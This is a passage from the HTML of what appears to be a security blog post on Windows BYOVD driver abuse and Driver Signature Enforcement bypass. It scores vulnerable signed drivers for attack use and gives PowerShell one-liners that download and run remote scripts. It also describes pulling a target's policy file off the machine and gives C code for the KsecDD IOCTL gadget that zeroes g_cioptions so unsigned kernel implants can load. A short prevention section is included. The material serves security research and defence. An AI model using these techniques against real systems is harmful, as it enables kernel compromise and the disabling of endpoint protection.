+  <!-- reject arrow right -->
+  <line x1="740" y1="74" x2="790" y2="74" stroke="#e74c3c" stroke-width="1"></line>
+  <text x="795" y="71" font-size="8" fill="#e74c3c">~900 no useful</text>
+  <text x="795" y="81" font-size="8" fill="#7f8c8d">primitive</text>
+
+  <!-- Stage 2 -->
+  <polygon points="120,128 740,128 706,168 154,168" fill="#1c2226" stroke="#566573" stroke-width="1"></polygon>
+  <text x="430" y="145" font-size="11" fill="#aab7b8" text-anchor="middle" font-weight="bold">~1,300 drivers — dangerous primitive present</text>
+  <text x="430" y="162" font-size="9" fill="#909ca0" text-anchor="middle">ZwTerminateProcess · MmMapIoSpace · ZwWriteVirtualMemory in imports</text>
+
+  <!-- Filter 2 -->
+  <line x1="430" y1="169" x2="430" y2="184" stroke="#566573" stroke-width="1.5"></line>
+  <rect x="250" y="181" width="360" height="18" fill="#161b22" rx="3" stroke="#2c3e50"></rect>
+  <text x="430" y="194" font-size="9" fill="#8b949e" text-anchor="middle">② Filter: HVCI bypass = TRUE — loads despite Memory Integrity</text>
+  <line x1="706" y1="148" x2="790" y2="148" stroke="#e74c3c" stroke-width="1"></line>
+  <text x="795" y="145" font-size="8" fill="#e74c3c">~820 fail</text>
+  <text x="795" y="155" font-size="8" fill="#7f8c8d">HVCI checks</text>
+
+  <!-- Stage 3 - HVCI purple -->
+  <polygon points="154,200 706,200 676,240 184,240" fill="#4a235a" stroke="#7d3c98" stroke-width="1.5"></polygon>
+  <text x="430" y="217" font-size="12" fill="#d7bde2" text-anchor="middle" font-weight="bold">479 HVCI-bypassing samples · 21.8% of catalogue</text>
+  <text x="430" y="234" font-size="9" fill="#c39bd3" text-anchor="middle">Has FORCE_INTEGRITY · No W+X · Structurally HVCI-compliant · Use byovd-watchdog</text>
+  <!-- byovd-watchdog badge -->
+  <rect x="8" y="208" width="155" height="28" fill="#0d2318" rx="4" stroke="#27ae60" stroke-width="1"></rect>
+  <text x="86" y="220" font-size="8" fill="#82e0aa" text-anchor="middle" font-weight="bold">🛡 BYOVD Watchdog</text>
+  <text x="86" y="232" font-size="8" fill="#52be80" text-anchor="middle">byovd-watchdog.pwnfuzz.com</text>
+
+  <!-- Filter 3 -->
+  <line x1="430" y1="241" x2="430" y2="256" stroke="#566573" stroke-width="1.5"></line>
+  <rect x="220" y="253" width="420" height="18" fill="#161b22" rx="3" stroke="#2c3e50"></rect>
+  <text x="430" y="266" font-size="9" fill="#8b949e" text-anchor="middle">③ Filter: Not in MS WDAC block list · SHA-256 available · VT score &lt; 5/71</text>
+  <line x1="676" y1="220" x2="790" y2="220" stroke="#e74c3c" stroke-width="1"></line>
+  <text x="795" y="217" font-size="8" fill="#e74c3c">Eliminated by</text>
+  <text x="795" y="227" font-size="8" fill="#7f8c8d">WDAC / no hash</text>
+
+  <!-- Stage 4 -->
+  <polygon points="184,272 676,272 650,308 210,308" fill="#1c2226" stroke="#566573" stroke-width="1"></polygon>
+  <text x="430" y="287" font-size="11" fill="#aab7b8" text-anchor="middle" font-weight="bold">~120–180 candidates · Not in MS block list · Hash confirmed</text>
+  <text x="430" y="303" font-size="9" fill="#909ca0" text-anchor="middle">789 LOLDrivers-exclusive samples (36.3%) — cross-reference with HVCI bypass pool</text>
+
+  <!-- Filter 4 -->
+  <line x1="430" y1="309" x2="430" y2="324" stroke="#566573" stroke-width="1.5"></line>
+  <rect x="220" y="321" width="420" height="18" fill="#161b22" rx="3" stroke="#2c3e50"></rect>
+  <text x="430" y="334" font-size="9" fill="#8b949e" text-anchor="middle">④ Filter: Device path recoverable · IRP_MJ_CREATE ungated · No DACL on device</text>
+  <line x1="650" y1="290" x2="790" y2="290" stroke="#e74c3c" stroke-width="1"></line>
+  <text x="795" y="287" font-size="8" fill="#e74c3c">DACL present /</text>
+  <text x="795" y="297" font-size="8" fill="#7f8c8d">path unknown</text>
+
+  <!-- Stage 5 DrvEye -->
+  <polygon points="210,340 650,340 628,374 232,374" fill="#1d2b1f" stroke="#27ae60" stroke-width="1"></polygon>
+  <text x="430" y="355" font-size="11" fill="#82e0aa" text-anchor="middle" font-weight="bold">~20–40 candidates · DrvEye UNGATED-sink confirmed</text>
+  <text x="430" y="371" font-size="9" fill="#76d7a3" text-anchor="middle">primitive classified · PoC generated · no caller access check on IRP handler</text>
+  <!-- DrvEye badge -->
+  <rect x="8" y="346" width="155" height="26" fill="#0d2318" rx="4" stroke="#27ae60" stroke-width="1"></rect>
+  <text x="86" y="358" font-size="8" fill="#82e0aa" text-anchor="middle" font-weight="bold">🔬 DrvEye Triage</text>
+  <text x="86" y="370" font-size="8" fill="#52be80" text-anchor="middle">python3 DrvEye.py --save-pocs</text>
+
+  <!-- Final arrow -->
+  <line x1="430" y1="375" x2="430" y2="388" stroke="#27ae60" stroke-width="2"></line>
+
+  <!-- Stage 6 final -->
+  <polygon points="232,388 628,388 606,430 254,430" fill="#145a32" stroke="#27ae60" stroke-width="2"></polygon>
+  <text x="430" y="406" font-size="13" fill="#82e0aa" text-anchor="middle" font-weight="bold">✅  VIABLE BYOVD CANDIDATE</text>
+  <text x="430" y="423" font-size="10" fill="#52be80" text-anchor="middle">Signed · HVCI-clean · Block-list absent · Path known · IOCTL decoded · No DACL</text>
+
+  <!-- Score legend -->
+  <rect x="40" y="442" width="780" height="38" fill="#0d1117" rx="4" stroke="#30363d"></rect>
+  <text x="55" y="457" font-size="9" fill="#82e0aa" font-weight="bold">5-Point Score:</text>
+  <text x="165" y="457" font-size="9" fill="#27ae60">● WILL LOAD (HVCI)</text>
+  <text x="310" y="457" font-size="9" fill="#27ae60">● Block-list absent</text>
+  <text x="450" y="457" font-size="9" fill="#27ae60">● Dangerous primitive</text>
+  <text x="620" y="457" font-size="9" fill="#27ae60">● UNGATED-sink</text>
+  <text x="730" y="457" font-size="9" fill="#27ae60">● Path known</text>
+  <text x="55" y="472" font-size="8" fill="#566573">All 5 green → operationally viable. Red on primitive or gating → move to next candidate.</text>
+  <text x="700" y="472" font-size="8" fill="#2d3436">benjitrapp.github.io 🦝</text>
+</svg>
+</div>
+
+<h3 id="byovd-watchdog-live-hvci-gap-intelligence">BYOVD Watchdog: Live HVCI Gap Intelligence</h3>
+
+<p><a href="https://github.com/pwnfuzz/byovd-watchdog">BYOVD Watchdog</a> by pwnfuzz (@ghostbyt3) automates HVCI gap tracking continuously. It is the updated successor to <a href="https://github.com/ghostbyt3/BYOVDFinder">BYOVDFinder</a>.</p>
+
+<p><strong>How it works:</strong></p>
+
+<ol>
+  <li>GitHub Actions periodically fetches Microsoft’s <code class="language-plaintext highlighter-rouge">SiPolicy_Enforced.xml</code></li>
+  <li><code class="language-plaintext highlighter-rouge">byovd.py</code> parses the XML and extracts all driver deny rules (hash-based and cert-based)</li>
+  <li><code class="language-plaintext highlighter-rouge">compare_hvci.py</code> cross-references against the full LOLDrivers API feed</li>
+  <li>The delta (LOLDrivers entries NOT blocked by the current HVCI policy) is published as <code class="language-plaintext highlighter-rouge">byovd_changelog.json</code> and surfaced at <a href="https://byovd-watchdog.pwnfuzz.com/">byovd-watchdog.pwnfuzz.com</a></li>
+</ol>
+
+<p><strong>Running BYOVDFinder locally:</strong></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code><span class="c"># One-liner against your live system policy</span><span class="w">
+</span><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="w">
+    </span><span class="s2">"https://raw.githubusercontent.com/ghostbyt3/BYOVDFinder/refs/heads/main/finder.ps1"</span><span class="w">
+</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Against a custom policy XML (exfiltrated from a target)</span><span class="w">
+</span><span class="o">.</span><span class="n">\finder.ps1</span><span class="w"> </span><span class="nt">-XmlFile</span><span class="w"> </span><span class="s2">"C:\Path\To\driversipolicy.xml"</span><span class="w">
+</span></code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<p>Expected output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code>DRIVER: somedriver.sys
+  Link: https://www.loldrivers.io/drivers/&lt;uuid&gt;
+  MD5:    &lt;hash&gt;  SHA1: &lt;hash&gt;  SHA256: &lt;hash&gt;
+--------------------------------------------------------------------------------
+[+] Number of Blocked Drivers: 1384
+[+] Number of Allowed Drivers: 479
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<h3 id="hvci-extraction-from-a-target-environment-red-team-context">HVCI Extraction from a Target Environment (Red Team Context)</h3>
+
+<p>Enterprises deploy custom WDAC policies beyond Microsoft’s defaults. Extract the active policy to find which drivers remain viable specifically on that target:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code><span class="c"># Requires admin — but you already have admin for BYOVD</span><span class="w">
+</span><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="w">
+    </span><span class="s2">"https://gist.githubusercontent.com/mattifestation/92e545bf1ee5b68eeb71d254cec2f78e/raw/.../CIPolicyParser.ps1"</span><span class="w">
+</span><span class="p">)</span><span class="w">
+</span><span class="n">ConvertTo-CIPolicy</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-BinaryFilePath</span><span class="w"> </span><span class="s1">'C:\Windows\System32\CodeIntegrity\driversipolicy.p7b'</span><span class="w"> </span><span class="se">`
+</span><span class="w">    </span><span class="nt">-XmlFilePath</span><span class="w"> </span><span class="s1">'C:\Windows\Temp\policy.xml'</span><span class="w">
+
+</span><span class="c"># Exfil policy.xml, then locally:</span><span class="w">
+</span><span class="n">python3</span><span class="w"> </span><span class="nx">finder.py</span><span class="w"> </span><span class="nx">policy.xml</span><span class="w">
+</span></code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<h3 id="scoring-a-candidate-the-five-point-checklist">Scoring a Candidate: The Five-Point Checklist</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code>python3 DrvEye.py candidate.sys <span class="se">\</span>
+    <span class="nt">--live-check</span> <span class="nt">--loldrivers</span> <span class="nt">--json</span> report.json <span class="nt">--save-pocs</span> <span class="nt">--verbose</span>
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Criterion</th>
+      <th>Green</th>
+      <th>Red</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Load verdict</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">WILL LOAD</code> under HVCI</td>
+      <td><code class="language-plaintext highlighter-rouge">WILL NOT LOAD</code> under HVCI</td>
+    </tr>
+    <tr>
+      <td><strong>Block list</strong></td>
+      <td>Not in WDAC or LOLDrivers list</td>
+      <td>In Microsoft block list</td>
+    </tr>
+    <tr>
+      <td><strong>Primitive</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">process-kill</code>, <code class="language-plaintext highlighter-rouge">kernel-write</code>, <code class="language-plaintext highlighter-rouge">physical-read</code></td>
+      <td><code class="language-plaintext highlighter-rouge">info-disclosure</code> only</td>
+    </tr>
+    <tr>
+      <td><strong>Gating</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">UNGATED-sink</code> (no access check)</td>
+      <td><code class="language-plaintext highlighter-rouge">GATED-sink</code> (check present)</td>
+    </tr>
+    <tr>
+      <td><strong>Device path</strong></td>
+      <td>Recoverable (static or emulated)</td>
+      <td>Unknown / obfuscated</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Five greens → operationally viable. Red on primitive or gating → skip.</p>
+
+<h3 id="wdac-and-loldrivers-based-prevention">WDAC and LOLDrivers-Based Prevention</h3>
+
+<p>Enable HVCI via Group Policy: <code class="language-plaintext highlighter-rouge">Computer Configuration → Administrative Templates → System → Device Guard → Turn On Virtualization Based Security</code>.</p>
+
+<p>Verify a candidate against the block list:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code>python3 DrvEye.py BootRepair.sys <span class="nt">--live-check</span> <span class="nt">--loldrivers</span> <span class="nt">--json</span> report.json
+<span class="nb">grep</span> <span class="s2">"wdac_block</span><span class="se">\|</span><span class="s2">loldrivers_match"</span> report.json
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<p>Deploy the LOLDrivers community WDAC deny policy alongside Microsoft’s built-in block list; as of mid-2026 these together still leave 479 HVCI-bypassing drivers uncovered.</p>
+
+<hr>
+
+<h2 id="dse-the-gatekeeper-and-its-bypass">DSE: The Gatekeeper and Its Bypass</h2>
+
+<p>BYOVD’s defining property is that it does not touch Driver Signature Enforcement. A legitimately signed driver complies with the enforcement policy and the kernel loads it without complaint. There is, however, a second and more aggressive technique: disable DSE entirely, enabling an attacker to load any unsigned driver including a custom kernel implant. Understanding both approaches clarifies why BYOVD is operationally preferred when a signed carrier is available, and when DSE bypass becomes necessary.</p>
+
+<h3 id="dse-internals-g_cioptions-and-cidll">DSE Internals: g_cioptions and CI.dll</h3>
+
+<p>Driver Signature Enforcement lives inside <code class="language-plaintext highlighter-rouge">CI.dll</code> (Code Integrity), the Windows component that verifies Authenticode signatures at driver load time. When <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> processes a <code class="language-plaintext highlighter-rouge">NtLoadDriver</code> call, it invokes <code class="language-plaintext highlighter-rouge">CI.dll</code> verification routines (<code class="language-plaintext highlighter-rouge">SeValidateImageHeader</code> and related functions). A failed check returns <code class="language-plaintext highlighter-rouge">STATUS_INVALID_IMAGE_HASH</code> and the driver load is aborted before a single byte of driver code executes.</p>
+
+<p>The enforcement state is governed by a single flag inside <code class="language-plaintext highlighter-rouge">CI.dll</code>: <strong><code class="language-plaintext highlighter-rouge">g_cioptions</code></strong>. Its effective values control the strictness of enforcement:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><code class="language-plaintext highlighter-rouge">g_cioptions</code></th>
+      <th>Enforcement state</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">0x00</code></td>
+      <td>Disabled. Any driver, signed or unsigned, loads freely.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">0x06</code></td>
+      <td>Standard enforcement. Valid Authenticode chain required.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">0x08</code>+ (HVCI)</td>
+      <td>Strict. Hypervisor validates in VTL1 before the kernel maps the image.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Writing a single zero to <code class="language-plaintext highlighter-rouge">&amp;g_cioptions</code> neutralises DSE for the lifetime of the current boot. This is the kernel patch that tools like the older <strong>DSEFix</strong> relied upon, and the same write that Lazarus Group performed via <code class="language-plaintext highlighter-rouge">dell_bios.sys</code> in 2022 (see threat actor table above) before loading a custom unsigned backdoor driver. Three common paths to this write exist in practice:</p>
+
+<ol>
+  <li><strong>Physical memory mapping</strong> via a driver that imports <code class="language-plaintext highlighter-rouge">MmMapIoSpace</code>: map the physical page containing <code class="language-plaintext highlighter-rouge">g_cioptions</code> and patch it directly. Used by early DSEFix variants.</li>
+  <li><strong>Arbitrary virtual write</strong> via a BYOVD carrier importing <code class="language-plaintext highlighter-rouge">ZwWriteVirtualMemory</code> or equivalent: load a signed carrier, use its primitive to overwrite <code class="language-plaintext highlighter-rouge">g_cioptions</code> in kernel virtual address space, then optionally unload the carrier.</li>
+  <li><strong>Kernel function call gadget</strong> via KsecDD.sys: the KExecDD technique, reimplemented by Dsebler. No third-party carrier required.</li>
+</ol>
+
+<h3 id="the-dsebler-technique-ksecddsys-as-a-write-gadget">The Dsebler Technique: KsecDD.sys as a Write Gadget</h3>
+
+<p><a href="https://github.com/lem0nSec/Dsebler">Dsebler</a> by lem0nSec is a C reimplementation of the KExecDD technique. Unlike third-party BYOVD carriers, it exploits <strong>KsecDD.sys</strong>, a legitimate Microsoft driver shipped with every Windows installation. KsecDD.sys is the kernel counterpart to LSASS for cryptographic operations; it exposes an IPC channel that LSASS uses for key material exchange.</p>
+
+<p>The exploit path centres on a vulnerable IOCTL handler at <strong><code class="language-plaintext highlighter-rouge">0x39006f</code></strong>. When a crafted 16-byte input structure is passed to this handler, it triggers the following internal call chain:</p>
+
+<div class="ghidra-mock" style="overflow-x:auto;">
+  <div class="gm-bar">
+    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
+    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">dsebler_chain — KsecDD.sys › CI.dll :: g_cioptions = 0</span>
+  </div>
+  <div style="font-family:'Courier New',monospace;font-size:12.5px;line-height:2.0;">
+
+    <div style="background:#0d1117;padding:12px 22px 14px;border-bottom:1px solid #21262d;">
+      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 3 · User Mode</div>
+      <div><span style="color:#8b949e;">CreateFile(</span><span style="color:#17fe33;">"\\.\KsecDD"</span><span style="color:#8b949e;">) </span><span style="color:#484f58;">→ </span><span style="color:#60a5fa;">hDevice</span></div>
+      <div><span style="color:#484f58;">// build outer IPC_SET_FUNCTION_RETURN_PARAMETER (16 bytes)</span></div>
+      <div><span style="color:#60a5fa;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hDevice</span><span style="color:#8b949e;">,&nbsp;</span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;">, &amp;outerParam, 16, NULL, 0, &amp;n, NULL)</span></div>
+    </div>
+
+    <div style="background:#161b22;text-align:center;padding:7px 0;color:#f97316;font-size:11px;letter-spacing:1px;border-top:1px dashed #30363d;border-bottom:1px dashed #30363d;">
+      ▼&nbsp;&nbsp;IRP crosses Ring 3 → Ring 0 boundary&nbsp;&nbsp;▼
+    </div>
+
+    <div style="background:#0d1117;padding:12px 22px 16px;border-bottom:1px solid #21262d;">
+      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 0 · Kernel Mode · KsecDD.sys (Microsoft-signed)</div>
+      <div><span style="color:#8b949e;">IOCTL </span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;"> → </span><span style="color:#a78bfa;">KsecFastIoDeviceControl</span></div>
+      <div style="margin-left:22px;"><span style="color:#484f58;">└─► </span><span style="color:#fbbf24;">KsecIoctlHandleFunctionReturn</span><span style="color:#8b949e;">(outerParam)</span></div>
+      <div style="margin-left:46px;"><span style="color:#484f58;">└─► </span><span style="color:#fbbf24;">CallInProgressCompleted</span><span style="color:#8b949e;">(innerParam)</span></div>
+      <div style="margin-left:70px;"><span style="color:#484f58;">└─► </span><span style="color:#ef4444;">rip = GadgetAddress</span><span style="color:#484f58;">&nbsp;&nbsp;; executes: </span><span style="color:#17fe33;">mov [rcx], rdx</span></div>
+      <div style="margin-left:94px;"><span style="color:#484f58;">rcx = </span><span style="color:#f97316;">&amp;g_cioptions</span><span style="color:#484f58;">&nbsp;&nbsp;; target in CI.dll (build-specific offset)</span></div>
+      <div style="margin-left:94px;"><span style="color:#484f58;">rdx = </span><span style="color:#60a5fa;">0x00000000</span><span style="color:#484f58;">&nbsp;&nbsp;&nbsp;; value to write — disables enforcement</span></div>
+    </div>
+
+    <div style="background:#160b0b;padding:12px 22px 14px;border-top:2px solid #7f1d1d;">
+      <div style="color:#ef4444;font-weight:600;margin-bottom:8px;">◼ CI.dll :: g_cioptions = 0x00 — DSE disabled for this boot</div>
+      <div style="display:flex;gap:28px;flex-wrap:wrap;">
+        <span style="color:#6b7280;font-size:11px;">✓ Unsigned drivers now load</span>
+        <span style="color:#6b7280;font-size:11px;">✓ Custom kernel implants viable</span>
+        <span style="color:#6b7280;font-size:11px;">✗ No EID 6 for KsecDD (already loaded at boot)</span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<p>Two nested 16-byte IPC structures control the exploit. The outer structure holds a pointer to the inner structure and the <code class="language-plaintext highlighter-rouge">rdx</code> value to write. The inner structure holds the gadget address (loaded into <code class="language-plaintext highlighter-rouge">rip</code> by <code class="language-plaintext highlighter-rouge">CallInProgressCompleted</code>) and the <code class="language-plaintext highlighter-rouge">rcx</code> parameter (the address of <code class="language-plaintext highlighter-rouge">g_cioptions</code>):</p>
+
+<div class="ghidra-mock" style="overflow-x:auto;">
+  <div class="gm-bar">
+    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
+    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">dsebler_structs.c — IPC structures for IOCTL 0x39006f</span>
+  </div>
+  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
+    <div><span style="color:#484f58;">// Inner structure: gadget address + rcx target (16 bytes)</span></div>
+    <div><span style="color:#60a5fa;">typedef struct </span><span style="color:#a78bfa;">_IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;"> {</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> GadgetAddress;</span><span style="color:#484f58;">  // loaded into rip: executes mov [rcx], rdx</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> RcxParameter;</span><span style="color:#484f58;">  // target address: &amp;g_cioptions in CI.dll</span></div>
+    <div><span style="color:#8b949e;">} IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER;</span></div>
+    <div style="margin-top:8px;"><span style="color:#484f58;">// Outer structure: ptr to inner + rdx value (16 bytes)</span></div>
+    <div><span style="color:#60a5fa;">typedef struct </span><span style="color:#a78bfa;">_IPC_SET_FUNCTION_RETURN_PARAMETER</span><span style="color:#8b949e;"> {</span></div>
+    <div style="margin-left:20px;"><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;">* pDeep;</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> RdxValue;</span><span style="color:#484f58;">     // 0 = disable DSE · non-zero = re-enable</span></div>
+    <div><span style="color:#8b949e;">} IPC_SET_FUNCTION_RETURN_PARAMETER;</span></div>
+    <div style="margin-top:12px;padding-top:12px;border-top:1px solid #21262d;"><span style="color:#484f58;">// Disable DSE: write 0 to g_cioptions</span></div>
+    <div><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;"> inner = {</span></div>
+    <div style="margin-left:20px;"><span style="color:#8b949e;">.</span><span style="color:#17fe33;">GadgetAddress</span><span style="color:#8b949e;"> = (PVOID)</span><span style="color:#f97316;">GADGET_OFFSET</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">  // build-specific — recalc after each OS update</span></div>
+    <div style="margin-left:20px;"><span style="color:#8b949e;">.</span><span style="color:#17fe33;">RcxParameter</span><span style="color:#8b949e;"> = (PVOID)</span><span style="color:#f97316;">G_CIOPTIONS_ADDR</span><span style="color:#8b949e;">,</span><span style="color:#484f58;"> // g_cioptions in loaded CI.dll image</span></div>
+    <div><span style="color:#8b949e;">};</span></div>
+    <div><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_PARAMETER</span><span style="color:#8b949e;"> outer = { &amp;inner, (PVOID)</span><span style="color:#60a5fa;">0ULL</span><span style="color:#8b949e;"> };</span></div>
+    <div style="margin-top:8px;"><span style="color:#fbbf24;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hKsecDD</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;">, &amp;outer, </span><span style="color:#f97316;">sizeof(outer)</span><span style="color:#8b949e;">, NULL, 0, &amp;dwReturned, NULL);</span></div>
+    <div style="margin-top:6px;"><span style="color:#484f58;">// Supported build: Windows 10 19045 · extend by recalculating offsets per CI.dll version</span></div>
+  </div>
+</div>
+
+<p><strong>Why KsecDD.sys cannot be blocked:</strong> it is a Microsoft-signed driver present on every Windows system from Vista onward. Any WDAC deny-list entry against KsecDD.sys breaks LSASS cryptographic operations, disabling BitLocker, Windows Hello, and NTLM authentication. This persistence in the trusted driver pool gives the technique a structural durability that third-party BYOVD carriers lack.</p>
+
+<p><strong>Operational constraint:</strong> current Dsebler hardcodes the <code class="language-plaintext highlighter-rouge">g_cioptions</code> address and the ROP gadget offset for Windows 10 build 19045. Each new Windows build recompiles <code class="language-plaintext highlighter-rouge">CI.dll</code>, shifting both values. Remaining operational across patch cycles requires recalculating these offsets after each feature update.</p>
+
+<h3 id="byovd-vs-dse-bypass-two-paths-to-ring-0">BYOVD vs. DSE Bypass: Two Paths to Ring 0</h3>
+
+<p>The two techniques solve different problems. BYOVD kills a running process via a kernel primitive and requires a signed carrier. DSE bypass enables loading of arbitrary unsigned code and requires a reliable kernel write. An operator choosing between them asks a simple question: is the goal to terminate a process, or to run a custom kernel implant?</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>&nbsp;</th>
+      <th><strong>BYOVD (DSE-compliant)</strong></th>
+      <th><strong>DSE Bypass (Dsebler / KExecDD model)</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Driver used</strong></td>
+      <td>Legitimately signed third-party carrier</td>
